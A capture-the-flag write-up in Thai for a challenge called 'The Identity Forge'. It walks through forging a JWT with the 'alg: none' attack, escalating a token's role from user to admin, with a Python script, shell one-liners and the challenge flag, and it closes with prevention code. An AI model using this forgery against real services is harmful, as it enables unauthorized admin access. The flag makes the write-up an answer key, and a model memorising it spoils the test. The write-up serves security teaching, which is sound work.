# The Identity Forge - Writeup

## 📚 พื้นฐานที่ต้องรู้ (สอนตั้งแต่ 0)

### JWT คืออะไร? (ทบทวน)

JWT (JSON Web Token) ประกอบด้วย 3 ส่วน:
```
HEADER.PAYLOAD.SIGNATURE
```

1. **Header** - ระบุ algorithm และ type
2. **Payload** - ข้อมูลที่ต้องการส่ง
3. **Signature** - ลายเซ็นดิจิทัลเพื่อยืนยันความถูกต้อง

### Algorithm None Attack คืออะไร?

JWT มี algorithm หลายแบบ:
- `HS256` - HMAC with SHA-256 (symmetric)
- `RS256` - RSA with SHA-256 (asymmetric)
- `none` - ไม่มี signature!

**ช่องโหว่**: ถ้า server ยอมรับ algorithm "none" attacker สามารถ:
1. แก้ไข payload ได้ตามใจชอบ
2. ไม่ต้องรู้ secret key
3. ส่ง token ที่ไม่มี signature

---

## 🔍 วิธีแก้โจทย์ทีละขั้นตอน

### ขั้นตอนที่ 1: วิเคราะห์ Token เดิม

Token เดิม:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjk5MDAwMDAwfQ.xyz123signature
```

Decode Header:
```json
{"alg": "HS256", "typ": "JWT"}
```

Decode Payload:
```json
{"user": "john", "role": "user", "iat": 1699000000}
```

สังเกต: role เป็น "user" แต่เราต้องการ "admin"

### ขั้นตอนที่ 2: วางแผนการโจมตี

เป้าหมาย:
1. เปลี่ยน `role` จาก `"user"` เป็น `"admin"`
2. ใช้ algorithm `"none"` เพื่อไม่ต้องมี signature

### ขั้นตอนที่ 3: สร้าง Header ใหม่

```json
{"alg": "none", "typ": "JWT"}
```

Base64URL encode:
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
```

### ขั้นตอนที่ 4: สร้าง Payload ใหม่

```json
{"user": "john", "role": "admin", "iat": 1699000000}
```

Base64URL encode:
```
eyJ1c2VyIjoiam9obiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY5OTAwMDAwMH0
```

### ขั้นตอนที่ 5: รวมเป็น Token ปลอม

รูปแบบ: `header.payload.` (signature ว่าง แต่ต้องมีจุด)

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY5OTAwMDAwMH0.
```

### ขั้นตอนที่ 6: ส่ง Token ไปยัง Server

```python
result = verify_token(forged_token)
# {"success": True, "message": "Welcome Admin!", "flag": "flag{4lg0r1thm_n0n3_4tt4ck}"}
```

---

## 💻 วิธีแก้หลายแบบ

### วิธี 1: Python Script

```python
import base64
import json

# สร้าง header ใหม่ (alg: none)
header = {"alg": "none", "typ": "JWT"}
header_b64 = base64.urlsafe_b64encode(
    json.dumps(header, separators=(',', ':')).encode()
).rstrip(b'=').decode()

# สร้าง payload ใหม่ (role: admin)
payload = {"user": "john", "role": "admin", "iat": 1699000000}
payload_b64 = base64.urlsafe_b64encode(
    json.dumps(payload, separators=(',', ':')).encode()
).rstrip(b'=').decode()

# รวมเป็น token (signature ว่าง)
forged_token = f"{header_b64}.{payload_b64}."
print(forged_token)
```

### วิธี 2: CyberChef

1. ไปที่ https://gchq.github.io/CyberChef/
2. Recipe: `To Base64` (เลือก URL safe)
3. Input: `{"alg":"none","typ":"JWT"}`
4. ทำซ้ำสำหรับ payload
5. รวมด้วยตัวเอง

### วิธี 3: Command Line

```bash
# Header
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '='

# Payload  
echo -n '{"user":"john","role":"admin","iat":1699000000}' | base64 | tr '+/' '-_' | tr -d '='
```

### วิธี 4: jwt.io + Manual Edit

1. ไป jwt.io แก้ไข header และ payload
2. Copy token ที่ได้
3. ลบ signature ออก แต่เก็บจุดไว้

---

## 🎓 สิ่งที่ได้เรียนรู้

### 1. JWT Algorithm Confusion
- Server ต้องไม่เชื่อ algorithm จาก client
- ต้อง whitelist algorithm ที่ฝั่ง server

### 2. Base64URL Encoding
- ต่างจาก Base64 ปกติ (ใช้ - และ _ แทน + และ /)
- ไม่มี padding (=)

### 3. Token Forgery
- ถ้า algorithm เป็น "none" ไม่ต้องรู้ secret
- สามารถแก้ไข payload ได้ตามใจชอบ

---

## 🔐 Key Takeaways

| หัวข้อ | รายละเอียด |
|-------|-----------|
| Vulnerability | Algorithm None Attack |
| Impact | Privilege escalation, token forgery |
| Prevention | Whitelist algorithms on server |
| Tool | jwt.io, CyberChef, Python |

---

## 🛡️ การป้องกัน

### ❌ โค้ดที่ไม่ปลอดภัย

```python
# อย่าทำแบบนี้!
if header['alg'] == 'none':
    pass  # ข้ามการ verify
```

### ✅ โค้ดที่ปลอดภัย

```python
import jwt

# กำหนด algorithm ที่ยอมรับ (whitelist)
ALLOWED_ALGORITHMS = ['HS256']

def verify_token(token):
    try:
        payload = jwt.decode(
            token, 
            SECRET_KEY,
            algorithms=ALLOWED_ALGORITHMS  # ✅ Whitelist
        )
        return payload
    except jwt.InvalidAlgorithmError:
        return None
```

---

## 📚 Further Learning

1. **PortSwigger JWT Lab**: https://portswigger.net/web-security/jwt
2. **Auth0 JWT Vulnerabilities**: https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
3. **OWASP JWT Security**: https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html
4. **JWT Attack Playbook**: https://github.com/ticarpi/jwt_tool

---

## 🚩 FLAG

```
flag{4lg0r1thm_n0n3_4tt4ck}
```
